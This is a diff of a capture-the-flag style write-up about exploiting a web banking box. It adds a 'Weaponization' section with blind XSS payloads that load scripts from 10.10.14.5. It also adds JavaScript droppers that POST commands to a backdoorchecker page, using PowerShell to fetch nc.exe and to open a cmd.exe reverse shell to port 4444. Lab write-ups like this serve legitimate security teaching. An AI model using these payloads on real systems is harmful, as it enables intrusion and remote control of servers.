@@ -60,6 +60,7 @@ We can Register a account and login to discover a mechanism for transfering fund
 #### Directory/File Enumeration
 
 First I spider with Burp to crawl the site and build a map.
+
 ![](img/sitemap.png)
 
 While in my terminal I run `Gobuster` with `Seclists` because I wanted to compare/contrast the difference.
@@ -110,6 +111,7 @@ Progress: 8536 / 17771 (48.03%)^C
 The `/admin` dir is not accessible, session managment and authorization will be tested.
 
 `notes.txt` provided some useful Dev notes left behind possibly for later.
+
 ![](img/notes.png)
 
 let's do a quick HTTP packet header analysis of the `.php` files with `curl`
@@ -187,18 +189,57 @@ but I was feeling BF is a bit too much Script Kiddie like for an insane box,
 
 
 So now I switch over to Burp and Browser and head over to `login.php` and log back in with our account and attempt to transfer some funds.
+
 ![transfer](img/transfer.png)
 
-Once I submit the transfer I get prompted a JS alert stating that the `admin` will review our input in a minute. 
+Once I submit the transfer I get prompted a JS alert stating that the `admin` will review our input in a minute. This is a critical clue and enough for us to formulate an attack. 
+
 ![alert](img/alert.png)
 
-We know that the session tokens are static credentials and the transfer done in javascript from the alert. This is a indication of a possible blind XSS vulnerability where when the `admin` reviews our input, he will execute our malicious script. We might be able to utilize this to execute a .js stored on our own C2 host to drop and execute a payload. So now that we formulated our devious plan, lets build the tools we need to perform this.
-
-
-
+After our examination, we know that the session tokens are static credentials and the transfer is done in javascript from the alert. This is a indication of a possible blind XSS vulnerability where when the `admin` reviews our input, he will execute our malicious script. We might be able to utilize this to execute a .js stored on our own C2 host to drop and execute a payload. So now that we formulated our devious masterplan, lets build the tools we need to perform.
 
 ### Weaponization
-Intruder develops malware designed to exploit the vulnerability
+Here we build a simple XSS to drop in the comment box in `transfer.php`
+
+XSS payload
+```javascript
+//XSS To drop nc.exe:
+<script src=http://10.10.14.5/payd.js%3E</script>
+
+//XSS to Reverse Shell:
+<script src=http://10.10.14.5/pay.js%3E</script>
+```
+
+On localhost:
+Dropper
+`drop.js`
+```javascript
+function paintfunc(){
+    var http = new XMLHttpRequest();
+        var url = 'http://localhost/admin/backdoorchecker.php';
+        var params = 'cmd=dir | powershell -c Invoke-WebRequest -Uri "http://10.10.14.5/nc.exe" -OutFile "C:\\windows\\system32\\spool\\drivers\\color\\nc.exe"';
+        http.open('POST', url, true);
+        http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+        http.send(params);
+}
+
+paintfunc();
+```
+Execution
+`exe.js`
+```javascript
+function paintfunc(){
+    var http = new XMLHttpRequest();
+        var url = 'http://localhost/admin/backdoorchecker.php';
+        var params = 'cmd=dir | powershell -c "C:\\windows\\system32\\spool\\drivers\\color\\nc.exe" -e cmd.exe 10.10.14.5 4444';
+        http.open('POST', url, true);
+        http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+        http.send(params);
+}
+
+paintfunc();
+```
+
 
 ### Delivery
 Intruder transmits the malware via a phishing email or another medium
